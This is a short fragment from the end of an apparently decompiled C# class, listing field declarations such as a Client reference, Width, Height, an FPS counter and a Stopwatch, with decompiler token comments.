				}
			}
		}

		// Token: 0x040001F8 RID: 504
		public Client C;

		// Token: 0x040001F9 RID: 505
		public new int Width;

		// Token: 0x040001FA RID: 506
		public new int Height;

		// Token: 0x040001FB RID: 507
		private int int_0;

		// Token: 0x040001FC RID: 508
		private bool bool_1;

		// Token: 0x040001FD RID: 509
		private bool bool_2;

		// Token: 0x040001FE RID: 510
		private int int_1;

		// Token: 0x040001FF RID: 511
		private bool bool_3;

		// Token: 0x04000200 RID: 512
		private bool bool_4;

		// Token: 0x04000201 RID: 513
		public int FPS;

		// Token: 0x04000202 RID: 514
		public Stopwatch sw;
	}
}
